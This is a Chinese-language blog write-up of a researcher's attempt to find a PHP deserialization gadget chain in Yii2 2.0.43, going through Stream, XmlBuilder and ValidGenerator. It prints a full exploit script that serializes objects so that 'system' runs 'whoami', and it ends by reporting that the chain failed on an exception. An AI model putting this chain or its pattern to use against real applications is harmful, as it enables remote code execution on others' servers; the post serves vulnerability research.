前段时间YII2.0.42的链子也爆了出来,审了后突然想自己挖挖看有没有链子

于是我把YII2.0.43下了下来

直接寻找__destruct()方法,因为之前的师傅太猛了,导致现在存在的destruct方法大多数被加上了一个wakeup

最后苦苦找寻,终于找到了Stream.php

![image-20210930212004933](images/1.png)

跟进close()

![image-20210930212023511](images/2.png)

跟进一下

![image-20210930212106983](images/3.png)

`$this->stream`是可控的,那返回值就可以自由控制,这里可以去调用__toString()

定位到了XmlBuilder.php

```
public function __toString()
{
    return $this->__dom__->saveXML();
}
```

`$this->__dom__`可控,这里可以去触发__call()方法

定位到ValidGenerator.php

```
public function __call($name, $arguments)
{
    $i = 0;

    do {
        $res = call_user_func_array([$this->generator, $name], $arguments);
        ++$i;

        if ($i > $this->maxRetries) {
            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));
        }
    } while (!call_user_func($this->validator, $res));

    return $res;
}
```

这里就和2.0.42一样了,利用二重call去在do-while判断处进行RCE

一切看似在顺利地进行着,于是没吃午饭地开开心心地写着exp

```
<?php

namespace GuzzleHttp\Psr7 {

    use Codeception\Util\XmlBuilder;

    class Stream
    {
        private $stream;
        private $seekable;
        public function __construct()
        {
            $this->stream = new XmlBuilder();
            $this->seekable = false;
        }
    }
    echo base64_encode(serialize(new stream()));
}

namespace Codeception\Util {

    use Faker\ValidGenerator;

    class XmlBuilder
    {
        protected $__dom__;
        public function __construct()
        {
            $this->__dom__ = new ValidGenerator();
        }
    }
}

namespace Faker {
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct()
        {
            $this->generator = new DefaultGenerator();
            $this->validator = 'system';
            $this->maxRetries = '1';
        }
    }
    class DefaultGenerator
    {
        protected $default;
        public function __construct()
        {
            $this->default = 'whoami';
        }
    }
}
```

直接拿去打一下

淦,报错了

![image-20210930212906984](images/4.png)

他进入了Stream.php的toString方法,然后抛出了一个异常

![image-20211004084935196](images/5.png)

无奈只有打断点看看了

一直跟到stream类前一步发现

![image-20211004084741062](images/6.png)

如果该类中存在toString方法则会默认调用

看来这条链子是打不通了,最终只能无奈地退出程序

